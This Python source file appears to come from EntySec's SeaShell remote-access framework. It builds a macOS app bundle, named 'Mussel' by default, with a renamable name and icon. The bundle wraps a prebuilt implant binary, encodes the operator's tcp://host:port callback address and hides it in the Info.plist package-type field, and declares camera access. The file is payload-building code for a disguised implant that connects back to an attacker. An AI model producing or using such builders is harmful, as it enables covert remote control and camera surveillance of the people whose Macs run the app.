"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import shutil
import plistlib

from pex.string import String

from alive_progress import alive_bar
from seashell.lib.config import Config


def _sanitize_app_name(name: str) -> str:
    safe = os.path.basename(name)
    if os.path.altsep:
        safe = safe.replace(os.path.altsep, '')
    safe = safe.replace(os.path.sep, '')
    if safe in ('', '.', '..'):
        return ''
    return safe


class App(Config):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended to provide
    an interface to build or patch macOS application bundles.
    """

    def __init__(self, host: str, port: int) -> None:
        """ Initialize application builder.

        :param str host: host to connect to
        :param int port: port to connect to
        :return None: None
        """

        self.hash = String().base64_string(
            f'tcp://{str(host)}:{str(port)}', decode=True)

        self.app_name = 'Mussel'
        self.bundle_id = 'com.entysec.mussel'
        self.binary_name = 'main'
        self.icon = self.data_path + 'icons.icns'

    def set_name(self, name: str, bundle_id: str) -> None:
        """ Set application name.

        :param str name: name of application
        :param str bundle_id: bundle id (e.g. com.entysec.dummy)
        :return None: None
        """

        if name:
            safe = _sanitize_app_name(name)
            if safe:
                self.app_name = safe.lower().title()

        if bundle_id:
            self.bundle_id = bundle_id

    def set_icon(self, icon: str) -> None:
        """ Set application icon.

        :param str icon: icon path
        :return None: None
        """

        self.icon = icon

    def generate(self, path: str) -> str:
        """ Generate APP.

        :param str path: path to save APP
        :return str: path to new APP
        """

        with alive_bar(monitor=False, stats=False, ctrl_c=False, receipt=False,
                       title="Building {}".format(path)) as _:
            return self.build_app(path)

    def build_app(self, path: str) -> str:
        """ Build APP.

        :param str path: path to save zipped app
        :return str: path to new APP
        """

        path = os.path.abspath(path)

        if not os.path.isdir(path):
            path = os.path.split(path)[0]

        app = path + '/' + self.app_name + '/'
        bundle = app + self.app_name + '.app/'
        contents = bundle + 'Contents/'
        archive = path + '/' + self.app_name + '.zip'

        os.mkdir(app)
        os.mkdir(bundle)

        shutil.copytree(self.data_path + 'Contents', contents)

        self.craft_icons(contents)
        self.craft_plist(contents)

        shutil.make_archive(archive, 'zip', app)
        shutil.move(archive + '.zip', archive)
        shutil.rmtree(app)

        return archive

    def craft_icons(self, path: str) -> None:
        """ Craft icons.

        TODO: Convert png file to iconset (.icns)

        :param str path: path to save icon to
        :return None: None
        """

        path += '/Resources/'
        os.mkdir(path)

        shutil.copy(self.icon, path + 'icons.icns')

    def craft_plist(self, path: str) -> None:
        """ Craft plist file.

        :param str path: directory to save Info.plist
        :return None: None
        """

        plist_path = path + '/Info.plist'
        plist = {
            'CFBundleDisplayName': self.app_name,
            'CFBundleExecutable': self.binary_name,
            'CFBundleIconFile': 'icons.icns',
            'CFBundleIdentifier': self.bundle_id,
            'CFBundleInfoDictionaryVersion': '6.0',
            'CFBundleName': self.app_name,
            'CFBundlePackageType': self.hash,
            'CFBundleShortVersionString': '1.0.0',
            'LSMinimumSystemVersion': '10.0.0',
            'NSCameraUsageDescription': 'This app requires a camera access'
        }

        with open(plist_path, 'wb') as f:
            plistlib.dump(plist, f)
